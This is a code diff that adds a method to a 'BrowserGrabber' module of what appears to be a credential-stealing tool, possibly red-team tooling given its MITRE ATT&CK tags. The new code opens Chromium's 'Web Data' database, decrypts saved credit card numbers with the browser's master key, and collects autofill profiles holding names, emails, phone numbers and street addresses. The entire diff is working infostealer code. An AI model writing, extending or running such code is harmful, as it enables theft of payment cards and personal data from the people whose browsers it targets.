@@ -86,6 +86,9 @@ class BrowserGrabber(GrabberModule):
                     cookies = self._extract_chromium_cookies(profile_path, browser_name)
                     result.credentials.extend(cookies)
 
+                    web_data = self._extract_chromium_web_data(profile_path, browser_name, master_key)
+                    result.credentials.extend(web_data)
+
                 if result.credentials:
                     login_count = len([c for c in result.credentials
                                        if c.target_application.startswith(browser_name)
@@ -302,6 +305,84 @@ class BrowserGrabber(GrabberModule):
                 safe_sqlite_close(conn, tmp_path)
 
             break  # Found cookies DB, no need to try alternate path
+
+        return creds
+
+    def _extract_chromium_web_data(self, profile_path: str, browser_name: str,
+                                     master_key: bytes | None) -> list[ExtractedCredential]:
+        """Extract credit cards and autofill profiles from Chromium Web Data."""
+        creds = []
+        web_data_db = os.path.join(profile_path, "Web Data")
+
+        result = safe_sqlite_read(web_data_db)
+        if not result:
+            return creds
+
+        conn, tmp_path = result
+        try:
+            # Credit cards (encrypted like passwords)
+            try:
+                cursor = conn.execute(
+                    "SELECT name_on_card, expiration_month, expiration_year, "
+                    "card_number_encrypted FROM credit_cards"
+                )
+                for row in cursor:
+                    name = row["name_on_card"] or ""
+                    exp = f"{row['expiration_month']}/{row['expiration_year']}"
+                    encrypted_number = bytes(row["card_number_encrypted"]) if row["card_number_encrypted"] else b""
+
+                    decrypted_number = ""
+                    if encrypted_number:
+                        decrypted_number = self._decrypt_chromium_password(encrypted_number, master_key)
+
+                    creds.append(ExtractedCredential(
+                        source_module=self.name,
+                        credential_type="credit_card",
+                        target_application=f"{browser_name} (autofill)",
+                        username=name,
+                        decrypted_value=decrypted_number,
+                        encrypted_value=encrypted_number if not decrypted_number else b"",
+                        notes=f"expires={exp}",
+                        mitre_technique="T1555.003",
+                        source_file=web_data_db,
+                    ))
+            except Exception as e:
+                self.logger.debug(f"Credit card extraction failed: {e}")
+
+            # Autofill profiles (PII -- not encrypted)
+            try:
+                cursor = conn.execute(
+                    "SELECT full_name, email, number, street_address, "
+                    "city, state, zipcode FROM autofill_profiles LIMIT 20"
+                )
+                for row in cursor:
+                    name = row["full_name"] or ""
+                    email = row["email"] or ""
+                    phone = row["number"] or ""
+                    addr_parts = [
+                        p for p in (
+                            row["street_address"], row["city"],
+                            row["state"], row["zipcode"],
+                        ) if p
+                    ]
+                    address = ", ".join(addr_parts)
+
+                    if name or email:
+                        creds.append(ExtractedCredential(
+                            source_module=self.name,
+                            credential_type="pii",
+                            target_application=f"{browser_name} (autofill)",
+                            username=name,
+                            decrypted_value=email,
+                            notes=f"phone={phone}; addr={address}" if phone or address else "",
+                            mitre_technique="T1555.003",
+                            source_file=web_data_db,
+                        ))
+            except Exception as e:
+                self.logger.debug(f"Autofill extraction failed: {e}")
+
+        finally:
+            safe_sqlite_close(conn, tmp_path)
 
         return creds
 
